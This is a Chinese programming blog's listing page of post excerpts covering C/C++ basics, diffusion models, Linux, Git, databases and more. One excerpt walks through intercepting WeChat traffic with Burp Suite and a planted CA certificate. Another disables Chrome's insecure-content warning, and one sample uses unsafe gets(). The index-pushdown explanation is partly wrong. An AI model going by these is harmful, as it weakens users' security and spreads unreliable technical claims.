代码区：存放函数体的二进制代码，由操作系统进行管理。
全局区：存放全局变量及静态变量及常量
栈区：由编译器自动分配释放，存放函数的参数值，局部变量等。
堆区：由程序员分配和释放，若程序员不释放，程序结束时由操作系统回收。
栈区：
不要返回局部变量的地址
数据由编译器管理开辟和释放。
int *fun(int b) //形参数据也会在栈区 { int a = 10; //局部变量 存在栈区 栈区的数据在函数执行完后自动释放。 return &amp;a;	//返回局部变量的地址。 } 堆区
在c++ 主要利用new 开辟数据。
int * fun() { int *p = new int(10); // 利用new 关键字把10 开辟在堆上， return p; } int main() { system("pause"); return 0; } 手动释放：delete
int * fun() { int * p = new int (10); retturn p; } void test() { int *p = fun(); cout &lt;&lt; *p &lt;&lt; endl; delete p; // 释放 内存 } //在堆上开辟数组 void test01() { int * arr = new int [10]; //10代表数组有10 个元素 for（int i = 0; i &lt; 10 ;i++ ) { arr[i] = i + 100; } for( int i = 0 ; i &lt; 10 ; i++) { cout &lt;&lt; arr[i] &lt;&lt;endl; } delete [] arr; // 释放的时候 要加上 [] } 2.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/558f998c4898bee9717ec4f5678abede/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/1f96ced99e308249195c8bfd030a2f58/" rel="bookmark">
			C语言--编写程序，从键盘输入月份号，输出该月的英文名。（用指针知识）
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		源代码：
#include &lt;stdio.h&gt; int main() { char *month[]={"January", "Februray", "March", "April", "May", "June", "July", "August", "September", "October", "November", "December"}; int m; printf("请输入月份号："); scanf("%d", &amp;m); if (m &gt;= 1 &amp;&amp; m &lt;= 12) printf("%s\n",*(month+m-1)); else printf("输入错误\n"); return 0; } 运行结果：
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/ffedfbad46abdf112e2dd4f4453e68b9/" rel="bookmark">
			【深度学习】Diffusion模型
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		Diffusion基础理论入门 方向：ddpm ==》 ddim 论文
公式推导：科学空间-苏剑林
Diffusion Models 视频：唐宇迪——Diffusion
1 t时刻，给图片1增加高斯分布噪声为图片2
2 使用噪声预测模型，输入为t时刻，输出为噪声分布，标签为步骤1中产生的高斯分布噪声
3 将时刻t和图片2作为预测模型(UNet)输入，t-1时刻的图片作为预测模型输出
4 推理时，使用随机(h,w,3)的高斯分布和时刻t(=2000)作为输入，输入为t-1时刻的图片；重复上述步骤2000次，即t-0时刻为生成图片
Latent Diffusion ==》Stable diffusion Latent Diffusion 论文：https://arxiv.org/abs/2112.10752
Stable diffusion由Stability AI 推出，基于Latent Diffusion制作，无论文。
Code: https://github.com/CompVis/latent-diffusion
原理 PPT1_Math_Reading_Group_Stable_Diffusion.pdf
视频讲解（建议看下面的视频讲解，文章中的图片来源于【2】Lightning AI）：
【1】试图做一个正常讲解Latent / Stable Diffusion的成年人
【2】Youtube_Lightning AI——Stable Diffusion Explained 总体训练流程
1 使用VAE模型的Encoder部分对图片进行编码，即生成特征图片1（其符合正太分布？）
VAE模型：下图源于VAE(Variational Autoencoder)简单推导及理解
2 在 t 时刻对特征图片1添加噪声
3 使用CLIP模型对条件信息进行处理，特征图片中信息作为q 文本或图片信息(condition)作为k和v
4 将特征图片2与条件信息再进行cross attention处理输入去噪UNet网络，重复本次操作 t-1次
5 将处理后的图片输入VAE模型的Decoder部分，生成原始图片
推理阶段
1 使用CLIP编码条件信息，并生成tN 高斯分布图片A
2 将未加条件信息和加了条件信息的图片输入 UNet网络，输出两张噪声编码图片B C
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/ffedfbad46abdf112e2dd4f4453e68b9/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/a0f374e96dbe562ff7267b5f0f125238/" rel="bookmark">
			微信小程序抓包-夜神模拟器结合BurpSuite抓包(可用于现在最新版本微信)
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		警告 2023年3月23日18.37.46:很多人说网络错误,目前我再次自己试过了,都没有出现这个问题,如果害怕出现网络异常等情况,就不要看下去了 前置 之前总是通过电脑来抓包,时常失效,这里就用夜神模拟器配合Burp来抓包也可以参考这位博主的文章 Fiddler+Proxifier进行PC端微信小程序抓包通过Fiddler模拟器抓包微信小程序（适用APP） 夜神模拟器安卓版本 Android7.1.2 使用到工具
burp绿色免装jdk版 百度网盘：链接：https://pan.baidu.com/s/1y7KuzSg_SKmtEP4OTRycwg?pwd=52pj 提取码：52pj夸克盘: https://pan.quark.cn/s/220e34228d8b#/list/share 参考文章
https://blog.csdn.net/qq_34498872/article/details/122469329
https://www.52pojie.cn/forum.php?mod=viewthread&amp;tid=1617968&amp;highlight=BurpSuite
https://blog.csdn.net/qq_44029310/article/details/126017134
开始教程 1.安装夜神模拟器并下载安装微信 官网下就可以
https://www.yeshen.com/ 记得安装微信
截止发这篇博客的时候,微信版本为8.0.3 安装好微信后登录自己微信
2.查看电脑ip地址并在burp当中添加 比如我的ip地址为192.168.200.65 按照图片上步骤添加自己的ip,端口设置为8888 3.夜神模拟器修改WiFi代理 输入自己电脑的ip地址和更改burp设置的端口号 4.pc,pc,pc浏览器下载证书 pc端浏览器输入证书网站192.168.200.65:8888(不同的ip不同,根据刚刚设置来决定) 5.window安装OpenSSL 5.1安装 这一步好像可以跳过,直接把转换后的per证书名称改为9a5ba575.0即可,我看另外一个人的教程计算生成出来的结果和这个一样,可能是统一的吧
下载网站
http://slproweb.com/products/Win32OpenSSL.html 单击这个EXE或者MSI,然后安装的时候一直下一步即可
5.2配置环境 安装完成后就要配置运行环境了
也可以参考这文章
https://blog.csdn.net/wuliang20/article/details/121014060 OpenSSL默认的安装路径我这里是
C:\Program Files\OpenSSL-Win64\bin 我们就新建环境变量OPENSSL_HOME值为C:\Program Files\OpenSSL-Win64\bin 注意,不要漏掉了bin 向环境变量path添加%OPENSSL_HOME% 测试安装是否成功 6.der证书转换为pem证书 1.可以用在线版本 http://web.chacuo.net/netsslcer2pem 2.也可以使用openssl来转换 openssl x509 -inform der -in cacert.der -out cacert.pem 转换效果是一样的
[外链图片转存失败,源站可能有防盗链机制,建议将图片保存下来直接上传(img-0jA3cj8x-1679567908039)(null)]
7.查看hash表示并修改pem文件名字为 hash标识.0 查看hash标识:pem证书所在目录下运行当前命令,文件名称需要改为自己对应的文件名称,记录下9a5ba575 openssl x509 -subject_hash_old -in cacert.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/a0f374e96dbe562ff7267b5f0f125238/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/a7e71ef401a56bdddc60d35db556b54f/" rel="bookmark">
			C语言--编写函数，判断一个字符串是否为回文串。
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		源代码：
#include &lt;stdio.h&gt; #include &lt;string.h&gt; #define N 100 int huiwen(char* p,int len){ char *ps,*pe; ps=p; pe=p+len-1; for(;ps&lt;=pe;ps++,pe--){ if(*ps!=*pe) return 0; } return 1; } int main() { char str[N]; printf("请输入一个字符串："); gets(str); int len=strlen(str); if(huiwen(str,len)) printf("该字符串是回文串\n"); else printf("该字符串不是回文串\n"); return 0; } 运行结果：
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/06df3d36338d4e4eff77eb62898e1e19/" rel="bookmark">
			如何增强前端代码的健壮性
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		前言
所谓前端的代码健壮性 是指我们的代码在正确和规范的环境中运行时 保证其正确 快速 高效 但是还有一些特殊的环境 比方说后端返回值出现问题 用户操作出现问题 没有网络 页面某些部分没有请求出数据 仍然要保证我们的代码能够正确的运行 给用户一些提示和反馈 不至于大面积的崩溃 出现一些让人意想不到的结果
一些常见问题的处理
1 处理数据异常
我们在从后端获取数据时 一般情况是正常的 但是后端有时候处理不得当 会产生一些空数据或者null 这个时候我们在取res.xxx或者数组为空数组时循环或者取数组某些项肯定会报错 尤其是程序间有关联时 前面某一步出现异常报错 整个程序就会瘫痪无法运行
此时我们就需要对数据提前进行异常的预处理 一种是判空处理，如(res || []).length，（res || {}).name等 一种是用try{}catch{}包裹正常的代码 catch里抛出异常处理 以保障其他代码不被影响 顺利运行
2 数据检验
利用一些判断或者正则 对表单判空 对手机号 密码 邮箱 姓名 数字 小数点等等一些项目中需要进行判断的地方提前判断 防止用户错误的输入导致程序提交后报错失败
3 能应对用户一些怪异的行为
我们写代码时 可能会先入为主的想象用户会按照我们设定的思路和顺序进行操作 其实现实可能完全相反 用户尤其容易出现交叉或者完全相反的顺序来 或者多次点击按钮 对于交叉顺序或者相反顺序操作的用户 我们可以用判断或者做一些其他的操作 限制用户的行为 告知按照xx顺序来操作
对于多次疯狂点击按钮的 我们可以限制其点击次数 也可以使用防抖和节流
通过以上代码端的控制 最大程度上保证我们的程序在应对一些怪异的用户行为时 仍然是可用的
4 注意响应式的问题
其实现在很多客户可能会要求所有屏幕和设备共用一套代码 这样相比两套代码 我们可以节约不少的代码段 缺点就是要写大量的响应式样式 在写pc端的时候要注意屏幕的安全范围 主体内容要在正常屏幕内保证在安全范围以内 不要超出去 我在做项目的过程中 一般会将pc端的安全范围控制在1200px 有一些客户群体有特殊要求 比如喜欢用超大屏设备或者超小屏设备的 再另行调整
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/06df3d36338d4e4eff77eb62898e1e19/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/d2d3575fd0860f4287e2a1389518d6a2/" rel="bookmark">
			“提效”｜教你用ChatGPT玩数据
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		ChatGPT与数据分析（二） 上文给简单聊了一下为什么ChatGPT不能取代数据分析师，本文我们来深入感受一下如何让GPT帮助数据分析师“提效”。
场景一：SQL取数 背景：多数数据分析师都要用SQL语言从数据库中提取数据，SQL虽然简单，但是写几百行取数代码也是很头疼的一个操作，这个时候不妨交给GPT试一试，示例如下：
这种简单的写法你可能觉得效率不高，对其嗤之以鼻，别急，把你的想法告诉它，让它来解决。
还不行？继续！
总结：简单的说对于SQL任务，告诉GPT你要做的事情，他就会模拟字段给出相应的代码，需要注意的就是AI虽好，但是错误也不少！还是要自己测试一下的。
场景二：Python代码 背景：ChatGPT既然能写SQL，写Python当然也不在话下，示例如下：
总结：想要用Python处理数据，把你想做的事告诉GPT，他就会教你应该怎么做了。当然除了处理数据，画图的代码也可以让GPT来生成。
注：GPT本质上能够直接生成图片，但是多数情况会由于网络传输原因不显示图片。
场景三：统计学 背景：除了对于数据的操作，很多时候我们也需要进行一些统计学的计算，如显著性检验等，同样的把问题抛给GPT即可。
可以继续从GPT那里得到其他方法（截图不完整，仅供展示）
总结：是不是感觉越来越强大了，不仅能帮助我们，还能教我们怎么做。但是！你以为到这就结束了？继续看！
场景四：实验设计 背景：很多时候作为数据分析师，我们需要进行整个分析流程的规划，如A/B实验、复盘分析、运营分析等，这种小问题，交给GPT即可。
总结 随着ChatGPT的不断升级，其强大的功能已经逐渐渗透到各行各业，二哥认为小伙伴们不必对GPT抱有抵触心理，对于我们而言，其本质可以看作是一个更加精准的“百度一下”，平时我们有问题找百度，从各种各样的帖子中拼凑自己需要的东西，GPT的出现大大的节省了我们在无效网页上浪费的时间，也可以说它从准确性上帮助我们起到了“提效”的作用。
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/ea1db99f105c6eb083f79cf4c3635eb8/" rel="bookmark">
			js递归遍历树形结构数据，获取所有数组id集合
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		实现思路 可以使用递归遍历整个树形数组，将每个节点的id加入到一个数组中，最后返回这个数组即可。
数据准备 let datas = [ { id: "1", pId: "0", children: [ { id: "1-1", pId: "1", }, ], }, { id: "2", pId: "0", children: [ { id: "2-1", pId: "1", children: [ { id: "2-1-2", pId: "2", }, ], }, ], }, ]; 代码实现 方式一
function getAllIds(tree, result) { //遍历树 获取id数组 for (const i in tree) { result.push(tree[i].id); // 遍历项目满足条件后的操作 if (tree[i].children) { //存在子节点就递归 getAllIds(tree[i].children, result); } } return result; } 获取结果 console.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/ea1db99f105c6eb083f79cf4c3635eb8/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/7640831d3ea2f83a026c2dedcd835f3b/" rel="bookmark">
			【Linux程序前台后台切换】
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		1、前台转后台
按如下步骤即可将前台任务转后台任务：
暂停当前前台任务；按下Ctrl+z命令键即可；如下图所示：
停掉当前前台任务
查看挂起的进程；输入jobs即可，如下图所示：
后台启动挂起的进程；命令行中输入“bg %作业号”即可。如这里是bg %1;
2、后台转前台
后台转前台与前台转后台相似，只需将bg改成fg即可
====
Linux程序前台后台切换
1、在Linux终端运行命令的时候，在命令末尾加上 &amp; 符号，就可以让程序在后台运行
root@Ubuntu$ ./tcpserv01 &amp;
2、如果程序正在前台运行，可以使用 Ctrl+z 选项把程序暂停，然后用 bg %[number] 命令把这个程序放到后台运行，摁Ctrl+z，然后在最后一行加上bg %number
3、对于所有运行的程序，我们可以用jobs –l 指令查看
[kettle@4 data-integration]$ jobs -l
4、也可以用 fg %[number] 指令把一个程序掉到前台
cat@Ubuntu:~/unp/unpv13e/tcpcliserv$ fg %1
./tcpserv01
5、也可以直接终止后台运行的程序，使用 kill 命令
cat@Ubuntu:~/unp/unpv13e/tcpcliserv$ kill %1
二、fg、bg、jobs、&amp;、nohup、ctrl+z、ctrl+c 命令
一、&amp;
加在一个命令的最后，可以把这个命令放到后台执行，如
watch -n 10 sh test.sh &amp; #每10s在后台执行一次test.sh脚本
二、ctrl + z
可以将一个正在前台执行的命令放到后台，并且处于暂停状态。
三、jobs
查看当前有多少在后台运行的命令
jobs -l选项可显示所有任务的PID，jobs的状态可以是running, stopped, Terminated。但是如果任务被终止了（kill），shell 从当前的shell环境已知的列表中删除任务的进程标识。
四、fg
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/7640831d3ea2f83a026c2dedcd835f3b/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/d6a00c5e56f2c9161733d016a96cac06/" rel="bookmark">
			KVM（虚拟化平台）概念及部署
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		前言： KVM 是基于虚拟化扩展（Intel VT 或者 AMD-V）的 X86 硬件的开源的 Linux 原生的全虚拟化解决方案。KVM 中，虚拟机被实现为常规的 Linux 进程，由标准 Linux 调度程序进行调度；虚机的每个虚拟 CPU 被实现为一个常规的 Linux 线程。这使得 KMV 能够使用 Linux 内核的已有功能。 但是，KVM 本身不执行任何硬件模拟，需要用户空间程序通过 /dev/kvm 接口设置一个客户机虚拟服务器的地址空间，向它提供模拟 I/O，并将它的视频显示映射回宿主的显示屏。目前这个应用程序是 QEMU
Qemu是一套独立的虚拟化解决方案； KVM是另一套虚拟化解决方案， 不过因为这个方案实际上只实现了内核中对处理器（Intel VT， AMD SVM）虚拟化特性的支持，换言之，他缺乏设备虚拟化以及相应的用户空间管理虚拟化的工具， 所以他借用了QEMU的代码并加以精简， 连同KVM一起构成了另外一个独立的虚拟化解决方案， 称之为： KVM+QEMU
Linux 上的用户空间、内核空间和虚机：
Guest：客户机系统，包括CPU（vCPU）、内存、驱动（Console、网卡、I/O 设备驱动等），被 KVM 置于一种受限制的 CPU 模式下运行。
KVM：运行在内核空间，提供 CPU 和内存的虚级化，以及客户机的 I/O 拦截。Guest 的 I/O 被 KVM 拦截后，交给 QEMU 处理。
QEMU：修改过的被 KVM 虚机使用的 QEMU 代码，运行在用户空间，提供硬件 I/O 虚拟化，通过 IOCTL /dev/kvm 设备和 KVM 交互。
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/d6a00c5e56f2c9161733d016a96cac06/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/3524eea09d32e8490f33987919dc0220/" rel="bookmark">
			sigmoid、Dice、ReLu激活函数简单介绍
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		----摘自chatgpt的回答
sigmoid函数 sigmoid函数是一种常用的神经网络激活函数，也称为Logistic函数。sigmoid函数的数学表达式如下：
f ( x ) = 1 1 + e − x f(x) = \frac{1}{1+e^{-x}} f(x)=1+e−x1​
其中， x x x表示输入， f ( x ) f(x) f(x)表示输出。sigmoid函数的输出在 ( 0 , 1 ) (0,1) (0,1)之间，具有单调性和可导性。
sigmoid函数的优点：具有平滑的S形曲线，能够将输入映射到 ( 0 , 1 ) (0,1) (0,1)之间的概率值，常用于二分类问题的输出层。此外，sigmoid函数的导数在 x = 0 x=0 x=0处取得最大值 1 4 \frac{1}{4} 41​，能够有效地加速神经网络的训练速度。
但是，sigmoid函数也存在一些问题：
首先，当输入 x x x较大或较小时，sigmoid函数的输出会接近于0或1，造成梯度消失问题，从而影响模型的性能。
其次，sigmoid函数的输出不是以0为中心的，会导致梯度更新时的偏移问题，从而影响模型的收敛速度。
因此，在实际应用中，人们通常使用其他的激活函数，如Relu、Leaky Relu、ELU等，这些激活函数能够更好地解决神经网络中的梯度消失和过拟合问题，具有更好的性能和稳定性。
Dice激活函数 Dice激活函数是一种用于神经网络的非线性激活函数，由阿里巴巴提出。Dice激活函数主要用于解决梯度消失和过拟合问题，能够有效地提高模型的鲁棒性和泛化能力。Dice激活函数的数学表达式如下：
D i c e ( x ) = 2 1 + e − β x − 1 \mathrm{Dice}(x) = \frac{2}{1+e^{-\beta x}} - 1 Dice(x)=1+e−βx2​−1
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/3524eea09d32e8490f33987919dc0220/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/1436bb588b935a81d2606ab244bfd7f2/" rel="bookmark">
			Linux进程的睡眠和唤醒简析
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		1 Linux进程的睡眠和唤醒
在Linux中，仅等待CPU时间的进程称为就绪进程，它们被放置在一个运行队列中，一个就绪进程的状 态标志位为TASK_RUNNING。一旦一个运行中的进程时间片用完， Linux 内核的调度器会剥夺这个进程对CPU的控制权，并且从运行队列中选择一个合适的进程投入运行。
当然，一个进程也可以主动释放CPU的控制权。函数 schedule()是一个调度函数，它可以被一个进程主动调用，从而调度其它进程占用CPU。一旦这个主动放弃CPU的进程被重新调度占用 CPU，那么它将从上次停止执行的位置开始执行，也就是说它将从调用schedule()的下一行代码处开始执行。
有时候，进程需要等待直到某个特定的事件发生，例如设备初始化完成、I/O 操作完成或定时器到时等。在这种情况下，进程则必须从运行队列移出，加入到一个等待队列中，这个时候进程就进入了睡眠状态。 Linux 中的进程睡眠状态有两种：
一种是可中断的睡眠状态，其状态标志位TASK_INTERRUPTIBLE；
另一种是不可中断的睡眠状态，其状态标志位为TASK_UNINTERRUPTIBLE。可中断的睡眠状态的进程会睡眠直到某个条件变为真，比如说产生一个硬件中断、释放 进程正在等待的系统资源或是传递一个信号都可以是唤醒进程的条件。不可中断睡眠状态与可中断睡眠状态类似，但是它有一个例外，那就是把信号传递到这种睡眠 状态的进程不能改变它的状态，也就是说它不响应信号的唤醒。不可中断睡眠状态一般较少用到，但在一些特定情况下这种状态还是很有用的，比如说：进程必须等 待，不能被中断，直到某个特定的事件发生。
在现代的Linux操作系统中，进程一般都是用调用schedule()的方法进入睡眠状态的，下面的代码演
示了如何让正在运行的进程进入睡眠状态。
sleeping_task = current;
set_current_state(TASK_INTERRUPTIBLE);
schedule();
func1();
/* Rest of the code ... */
在第一个语句中，程序存储了一份进程结构指针sleeping_task，current 是一个宏，它指向正在执行
的进程结构。set_current_state()将该进程的状态从执行状态TASK_RUNNING 变成睡眠状态
TASK_INTERRUPTIBLE。 如果schedule()是被一个状态为TASK_RUNNING 的进程调度，那么schedule()将调度另外一个进程占用CPU；如果schedule()是被一个状态为TASK_INTERRUPTIBLE 或TASK_UNINTERRUPTIBLE 的进程调度，那么还有一个附加的步骤将被执行：当前执行的进程在另外一个进程被调度之前会被从运行队列中移出，这将导致正在运行的那个进程进入睡眠，因为它已经不在运行队列中了。
我们可以使用下面的这个函数将刚才那个进入睡眠的进程唤醒。
wake_up_process(sleeping_task); 在调用了wake_up_process()以后，这个睡眠进程的状态会被设置为TASK_RUNNING，而且调度器
会把它加入到运行队列中去。当然，这个进程只有在下次被调度器调度到的时候才能真正地投入运行。
2 无效唤醒
几乎在所有的情况下，进程都会在检查了某些条件之后，发现条件不满足才进入睡眠。可是有的时候
进程却会在 判定条件为真后开始睡眠，如果这样的话进程就会无限期地休眠下去，这就是所谓的无效唤醒问题。在操作系统中，当多个进程都企图对共享数据进行某种处理，而 后的结果又取决于进程运行的顺序时，就会发生竞争条件，这是操作系统中一个典型的问题，无效唤醒恰恰就是由于竞争条件导致的。
设想有两个进程A 和B，A 进程正在处理一个链表，它需要检查这个链表是否为空，如果不空就对链
表里面的数据进行一些操作，同时B进程也在往这个链表添加节点。当这个链表是空的时候，由于无数据可操作，这时A进程就进入睡眠，当B进程向链表里面添加了节点之后它就唤醒A 进程，其代码如下：
A进程:
1 spin_lock(&amp;list_lock);
2 if(list_empty(&amp;list_head)) {
3 spin_unlock(&amp;list_lock);
4 set_current_state(TASK_INTERRUPTIBLE);
5 schedule();
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/1436bb588b935a81d2606ab244bfd7f2/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/a36b26bb25315308eb6421ec6dbd1775/" rel="bookmark">
			Git创建新分支，分支常用命令
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		 1 创建新分支并推送到远程 1.1 快速创建分支并切换到该分支 注意新建的分支是基于当前所在的分支来创建的，比如当前处于develop分支，新建的分支就基于此分支
git checkout -b 分支名称 git checkout -b develop_2.0.0 1.2 推送分支到远程仓库 即在远程仓库用此分支的代码来新建此分支，只有第一次需要用 -u，后续都是正常的commit、push。
-u表示把本地分支和远程分支进行关联，远程仓库的别名一般是origi
git push -u 远程仓库的别名 本地分支名称:远程分支名称 git push -u origin develop_2.0.0 2 分支常用命令 查看所有分支
git branch -a 创建新分支
git branch 分支名称 切换分支
git checkout 分支名称 合并分支，以feature合并到mian为例
git checkout 要合并到的分支(main) git merge 被合并分支名称(feature) 删除分支
git branch -d 分支名称 拉代码
git pull 提交代码
// 添加当前目录下所有文件到暂存区 git add . // 把暂存区的代码提交到本地仓库 git commit -m '本次修改内容' // 把本地仓库提交到远程仓库 git push 
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/02011c057aa145fa4d396e0e219d6470/" rel="bookmark">
			markdown图标收藏
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		😄 😆 😊 😃 😏 😍 😘 😚 😳 😌 😆 😁 😉 😜 😝 😀 😗 😙 😛 😴 😟 😦 😧 😮 😬 😕 😯 😑 😒 😅 😓 😥 😩 😔 😞 😖 😨 😰 😣 😢 😭 😂 😲 😱 😫 😠 😡 😤 😪 😋 😷 😎 😵 👿 😈 😐 😶 😇 👽 💛
💙 💜 ❤️ 💚 💔 💓 💗 💕 💞 💘 💖 ✨ ⭐ 🌟 💫 💥 💥 💢 ❗ ❓ ❕ ❔ 💤 💨 💦 🎶 🎵 🔥 💩 💩 💩 👍 👍 👎 👎 👌 👊 👊 ✊ ✌️ 👋 ✋ ✋ 👐 ☝️ 👇 👈 👉 🙌 🙏 👆 👏 💪 🤘 🖕 🏃 🏃 👫 👪 👬 👭 💃 👯 🙆 🙅 💁
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/02011c057aa145fa4d396e0e219d6470/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/fea6cfdd727cda3c053d98568cc8700b/" rel="bookmark">
			详细说明一下索引下推
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		索引下推（Index condition pushdown）是一种优化数据库查询的技术，它利用了数据库索引的特性，在一定条件下，在索引层面就过滤掉不需要的数据，从而减少查询时需要访问的数据块，提高查询效率。
在普通的查询中，数据库需要先从表中读取所有的数据记录，然后再根据查询条件过滤不需要的记录，最后返回查询结果。而在索引下推中，数据库会在索引树的节点上进行条件过滤，只将满足条件的数据块返回，而不是读取整个数据记录。这样可以避免从磁盘读取不必要的数据，降低IO开销，提升查询速度。
索引下推的主要优点是减少了回表操作，即减少了访问磁盘的次数和需要传输的数据量，从而提高了查询效率和响应速度。具体来说，如果查询条件涉及到的字段都可以通过索引直接获取，而不需要回表操作，那么查询速度将大大提高。
需要注意的是，索引下推并不是适用于所有类型的查询，它涉及到查询中所使用的索引类型和查询条件的限制。通常，只有涉及到等值查询或范围查询的情况下，才能使用索引下推技术实现优化。同时，索引下推也会产生额外的开销，需要消耗更多的CPU资源，因此需要在实际应用中进行评估和优化。
代码说明：
下面是一个使用索引下推进行优化的例子：
假设有一个名为orders的表，其中包含订单编号（order_id）、客户编号（cust_id）、订单金额（amount）等字段，其中order_id、cust_id字段分别创建了索引，现在需要查询订单金额大于等于1000元的订单数量，SQL查询语句为：
SELECT COUNT(*) FROM orders WHERE amount &gt;= 1000; 如果按照传统的查询方式，数据库需要先遍历整个表，找到所有金额大于等于1000元的订单记录，然后再统计符合条件的订单数量。这种方式的查询效率比较低，尤其是在表数据较大的情况下。
而如果使用索引下推技术，数据库就可以在索引树上进行条件过滤，只返回符合条件的订单数量。因为amount字段创建了索引，查询引擎会先在索引树上进行条件过滤，过滤掉所有金额小于1000元的订单记录，只将金额大于等于1000元的订单记录传给查询结果集，最后统计符合条件的订单数量。这种方式的查询效率相对较高，尤其是在数据量较大时效果更加明显。
如果要使用索引下推优化查询，首先需要创建支持索引下推的索引，具体步骤如下：
创建适当的索引：根据实际查询场景以及涉及到的字段创建索引，可以使用普通索引、唯一索引、全文索引等。
查询条件与索引关联：查询条件必须涉及到索引字段，才能进行索引下推优化。如果查询条件没有涉及到索引字段，就不能利用索引下推的优势。
检查查询计划：通过 explain 命令或可视化工具，查看查询计划，确保索引下推优化被使用。
下面以MySQL数据库为例，介绍如何创建索引和使用索引下推进行优化：
创建索引
使用CREATE INDEX语句创建索引。例如，为orders表的amount字段创建索引，可以执行如下命令：
CREATE INDEX idx_amount ON orders (amount); 查询条件与索引关联
查询条件必须涉及到索引字段。例如，查询所有金额大于等于1000元的订单，SQL查询语句为：
SELECT order_id, cust_id FROM orders WHERE amount &gt;= 1000; 这里的查询条件涉及到amount字段，是orders表上的一个索引字段。
检查查询计划
可以使用explain命令查看查询计划，确认是否使用了索引下推。例如，执行如下命令：
explain SELECT order_id, cust_id FROM orders WHERE amount &gt;= 1000; 如果查询计划中出现了Extra列中的Using index condition，则表示使用了索引下推。
需要注意的是，使用索引下推优化查询的效果会受到多个因素的影响，如索引类型、查询条件、数据量等。因此，在实际应用中需要针对具体的查询场景进行评估和优化。
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/5ca468a1061e7758a07d8f70592a78b1/" rel="bookmark">
			Anaconda常用命令
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		 1. 安装某库 conda install pkgname=version 2. 更新库 conda update pkgname=version 3. 无法安装某包 则输入如下命令:
anaconda serach -t conda pkgname 或者
conda search -f gcc 得到结果为：
选择其中一个安装
conda install -c https://conda.anaconda.org/AmirAlavi keras 或者
conda install -c AmirAlavi keras 
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/02caf35170f9efc5e57193c47d5321ea/" rel="bookmark">
			让谷歌浏览器不再显示不安全内容的提示
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		 如果你已经厌倦了Chorm的这个提示，可以让Chrome不要再喊了。 右键点击Chrome的快捷方式。在其属性里，将--allow-running-insecure-content加到最后面即可(注意前面有个空格 )。重新打开Chrome，就再也不会再看到“不安全内容”的提示了。 
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/062c3ea4a9351cefe70cf2ef463271a2/" rel="bookmark">
			重启指定Kubernetes节点上的所有Pod
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		以下是一个Python脚本，可以重启指定Kubernetes节点上的所有Pod，并在每次重启两个Pod后等待10秒钟再重启下两个Pod。请确保您已经安装了Kubernetes Python客户端（kubernetes）：
